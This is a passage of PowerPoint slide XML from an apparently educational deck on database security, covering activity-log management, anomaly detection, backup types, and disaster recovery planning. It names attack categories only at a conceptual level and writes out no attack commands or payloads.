              <a:t>Compliance:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Provides proof of data access controls for regulations like GDPR, HIPAA, PCI-DSS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Troubleshooting:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Helps diagnose errors, performance issues, and unintended data changes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1477271646"/>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80743-24B7-394B-483A-F878A9CFE0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26E77A-04DB-3EEA-C89F-C67CA3726BA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Activity Logs</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5FDE124A-BB27-2874-D9D4-57599078E2C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Best Practices for Management</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Secure &amp; Centralize Storage:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Write logs to a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>dedicated, secure server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> separate from the database to prevent tampering.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Immutable Storage:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Use Write-Once-Read-Many (WORM) storage to prevent deletion or alteration.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Define Retention Policy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Keep logs based on legal &amp; regulatory requirements (e.g., 1-7 years).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Automate Analysis:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Use SIEM or log management tools to analyze logs; don't rely on manual reviews.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30904929"/>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42627-ED7A-EE37-7153-EBE49FD09CAB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Anomaly Detection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE3A1571-969A-1A49-74D8-4F40966103E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="688016"/>
            <a:ext cx="7704000" cy="3915934"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The process of identifying unusual patterns or behaviors that deviate from established norms, potentially indicating a security threat.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Key Points:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Baseline Establishment:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The system first </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>learns "normal" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>behavior for users, applications, and typical data access patterns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Detection Techniques:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Statistical Analysis:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Flagging events that fall outside standard deviations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Machine Learning (ML):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Advanced systems use ML algorithms to continuously adapt the baseline and detect sophisticated, evolving threats.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Rule-Based Detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Flagging specific known-bad.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Common Anomalies:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Privilege Escalation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> A user attempting to access tables or functions beyond their normal privileges.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Data Exfiltration:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Unusually large volumes of data being selected or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>exported</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Access from unusual locations/times:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> A user account accessing data from a new geographic region or outside business hours.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>SQL Injection Patterns:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Detection of commonly used SQL injection strings in queries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2006671341"/>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49272-4117-4CAF-83ED-99FE00B5165B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Backup and Recovery Strategies </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B57F4A6-D2BB-B05A-2E17-FAC5F5387D9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Introduction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Backup:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> A copy of data stored separately so it can be restored if the original is lost or corrupted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Recovery:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> The process of restoring data from a backup after failure, attack, or disaster.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Goal → Ensure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>data availability, integrity, and business continuity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Importance of Backup &amp; Recovery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Protects against </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>hardware failures</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (disk crash, server failure).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Safeguards from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>cyberattacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (ransomware, SQL injection, malware).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Ensures resilience after </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>natural disasters</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (fire, flood, power outage).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Recovers from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>human errors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (accidental deletion, misconfiguration).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Meets </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>compliance requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (legal mandates for data retention).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="380842207"/>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68CE9-E4C4-FD1E-176A-D4D8A820D079}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Types of Backup</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F9359FE1-295C-B618-1D1E-5180F363D3CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Full Backup</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Copies the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>entire dataset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (all files/tables).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Pros: Simple, complete snapshot.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cons: Slow, storage-heavy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example: Full database dump every Sunday.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Incremental Backup</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Copies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>only the data changed since the last backup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (full or incremental).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Pros: Saves time &amp; storage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cons: Recovery requires restoring multiple sets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example: Daily backups after a weekly full backup.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Differential Backup</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Copies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>all changes since the last full backup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Pros: Faster than full; simpler recovery than incremental.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cons: Grows larger until the next full backup.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1803638171"/>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BDF70-2D2D-73C9-32E6-8A9840516BB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Disaster Recovery Plans (DRP)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D76EC776-CD96-A6C6-0572-B55AEF0E3E3A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Introduction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Disaster Recovery Plan (DRP):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> A documented, structured approach describing how an organization can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>resume critical operations and restore IT systems after a disaster</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (natural, technical, or human-made).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Part of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Business Continuity Planning (BCP)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, but specifically focused on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IT infrastructure, data, and applications</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Why Disaster Recovery is Important</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Protects business from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>data loss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ensures </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>service availability</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> after disruptions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reduces </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>downtime costs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (financial and reputational).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Helps meet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>compliance and legal requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Builds </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>customer trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> by showing resilience.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
